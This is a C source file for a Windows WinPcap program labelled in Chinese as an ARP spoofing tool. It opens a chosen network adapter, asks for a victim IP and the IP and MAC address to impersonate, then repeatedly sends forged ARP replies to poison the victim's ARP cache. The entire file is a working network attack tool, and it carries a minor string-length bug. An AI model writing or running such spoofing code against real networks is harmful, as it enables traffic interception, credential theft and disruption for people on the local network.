/*
程序名称：ARP欺骗程序
*/

#define HAVE_REMOTE

#pragma pack(1)// 设定为1字节对齐，不然packet会出问题

#include <stdio.h>
#include <winsock2.h>  
#include <pcap.h>
#include "ARPSpoofing.h"

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "ws2_32.lib")

int GetMacByIP(pcap_t *p, const char *ip, u_char mac[]);
int main(int argc, char* argv[])
{
	pcap_if_t *alldevs;			//获取到的全部网卡
	pcap_if_t *device;			//用于遍历全部网卡
	pcap_t *adhandle;

	int i = 0, device_id = 0;
	char errbuf[PCAP_ERRBUF_SIZE] = {0};
	char sz_srcIP[17] = {0},sz_dstIP[17] = {0};
	PACKET packet;			//要发送的数据包
	int pack_cnt = 100;		//默认发送100个ARP欺骗包

	printf("Getting interface ......\n");
	if (-1 == pcap_findalldevs(&alldevs, errbuf))		//获取本机上的网卡
	{
		printf("Error in pcap_findalldevs: %s\n", errbuf);
		system("PAUSE");
		pcap_freealldevs(alldevs);		//释放资源
		return 1;
	}

	//打印找到的网卡名及其描述
	for (device =alldevs; device != NULL; device = device -> next)
	{
		printf("%2d. %s", ++i, device -> name);
		if (device -> description)
		{
			printf(" (%s)\n",device -> description);
		}
		else
		{
			printf(" (No decription available)\n");
		}
	}

	//没找到网卡
	if (i == 0)
	{
		printf("\nNo interface found! Please make sure WinPcap is installed.\n");
		system("PAUSE");
		pcap_freealldevs(alldevs);		//释放资源
		return 1;
	}

	do				//输入选择的网卡编号
	{
		printf("Please input NO. of interface you select (1 to %d): ", i);
		scanf("%d", &device_id);
		if (device_id > i)
		{
			printf("Error: Wrong NO.! Please make sure NO. ranges from 1 to %d\n", i);
		}
	} while (device_id > i);

	//指针移动到选择的网卡
	for(device = alldevs, i = 0; i < device_id-1; device = device -> next, i++);
	
	//打开网卡
	if (NULL == (adhandle = pcap_open(device -> name,	//网卡名
										60,				//只保存数据包前60字节
										PCAP_OPENFLAG_PROMISCUOUS,	//混杂模式
										1000,				//读超时设为1秒
										NULL,				//远程认证为空
										errbuf				//错误信息
					)))
	{
		printf("\nUnable to open the adapter. %s is not supported by WinPcap\n", device -> name);
		pcap_freealldevs(alldevs);		//释放资源
		system("PAUSE");
		return 1;
	}

	//输入受骗者IP地址
	printf("Please input IP address of the host you want to spoof(e.g. 192.168.1.1):\n");
	getchar();	//读入输入NO.后回车
	fgets(sz_dstIP, sizeof(sz_dstIP), stdin);	//读入目标IP
	sz_dstIP[strlen(sz_dstIP)-1] = '\0';
	GetMacByIP(adhandle,sz_dstIP,packet.ethdr.eh_dst);	//获取目标IP的MAC地址
	//printf(packet.ethdr.eh_dst);

	//输入想要伪装的IP地址
	printf("Please input IP address you want to pretend(e.g. 192.168.1.1):\n");
	fgets(sz_srcIP, sizeof(sz_srcIP), stdin);	//读入要伪装的IP
	sz_srcIP[strlen(sz_dstIP)-1]='\0';

	//输入想要伪装的MAC地址
	printf("Please input MAC address you want to pretend(e.g. 01-23-45-67-89-ab):\n");
	scanf("%x-%x-%x-%x-%x-%x", &packet.ethdr.eh_src[0], &packet.ethdr.eh_src[1], &packet.ethdr.eh_src[2],
		&packet.ethdr.eh_src[3], &packet.ethdr.eh_src[4], &packet.ethdr.eh_src[5]);

	packet.ethdr.eh_type=htons(ETH_ARP);	//以太帧类型为ARP报文

	packet.arphdr.arp_htype=htons(ARP_HARDWARE);	//填充ARP头
    packet.arphdr.arp_ptype=htons(ETH_IP);			//IP协议
    packet.arphdr.arp_hlen=6;						//硬件地址长为6字节
    packet.arphdr.arp_plen=4;						//IP协议地址长为4字节
    packet.arphdr.arp_op=htons(ARP_REPLY);			//类型是ARP响应包
	memcpy(packet.arphdr.arp_sha,packet.ethdr.eh_src,6);	//源MAC地址与以太头中相同
	packet.arphdr.arp_spa=inet_addr(sz_srcIP);		//源IP地址
	memcpy(packet.arphdr.arp_tha,packet.ethdr.eh_dst,6);	//目的MAC地址与以太头中相同
	packet.arphdr.arp_tpa=inet_addr(sz_dstIP);		//目的IP地址	

	printf("Spoofing at %s has started. ",sz_dstIP);
	while (pack_cnt--)	//默认发送100个ARP欺骗包
	{
		if (pcap_sendpacket(adhandle, (u_char*)&packet, sizeof(PACKET)) != 0)
		{
			printf("\nError in sending the packet: %s\n", pcap_geterr(adhandle));
			pcap_freealldevs(alldevs);		//释放资源
			system("PAUSE");
			return 1;
		}
		printf("packet sending\n");
		Sleep(500);		//每隔500ms发送一个数据包
	}
	printf("%s has been spoofed.\n ",sz_dstIP);
	pcap_freealldevs(alldevs);		//释放资源
	system("PAUSE");
	return 0;
}

//根据IP地址获取MAC地址
int GetMacByIP(pcap_t *p, const char *ip, u_char mac[])
{
	struct pcap_pkthdr * pkt_header;
    u_char * pkt_data; 
	unsigned char   sendbuf[42];
	int    i;
	ETHDR eth;
	ARPHDR arp;
   
	for(i = 0; i < ETHER_ADDR_LEN; i++)
    {
        eth.eh_dst[i] = 0xFF;			//广播报文
        eth.eh_src[i]=0;				//源地址可以不写
        arp.arp_sha[i]=0;
        arp.arp_tha[i]=0x00;
    }
    eth.eh_type=htons(ETH_ARP);			//类型是ARP报文

	arp.arp_htype=htons(ARP_HARDWARE);	//填充ARP请求报文头
	arp.arp_ptype=htons(ETH_IP);
	arp.arp_hlen=6;
	arp.arp_plen=4;
	arp.arp_op=htons(ARP_REQUEST);
	arp.arp_spa=0;
	arp.arp_tpa=inet_addr(ip);
	memset(sendbuf,0,sizeof(sendbuf));
	memcpy(sendbuf,&eth,sizeof(eth));
	memcpy(sendbuf+sizeof(eth),&arp,sizeof(arp));
	if(pcap_sendpacket(p,sendbuf,42)!=0)
	{
		printf("Error in pcap_sendpacket!\n");
		return 1;
	}
	while((pcap_next_ex(p,&pkt_header,(const u_char**)&pkt_data))>0)	//截获目的IP的响应报文
	{
		if(*(unsigned short *)(pkt_data+12)==htons(ETH_ARP)&&
			*(unsigned short*)(pkt_data+20)==htons(ARP_REPLY)&&
			*(unsigned long*)(pkt_data+28)==inet_addr(ip)&&
			*(unsigned long*)(pkt_data+38)==0)	//是我们要的响应报文
		{
			memcpy(mac,pkt_data+22,ETHER_ADDR_LEN);		//偏移22的位置是目的IP的MAC地址
		}
	}
	return 0;
}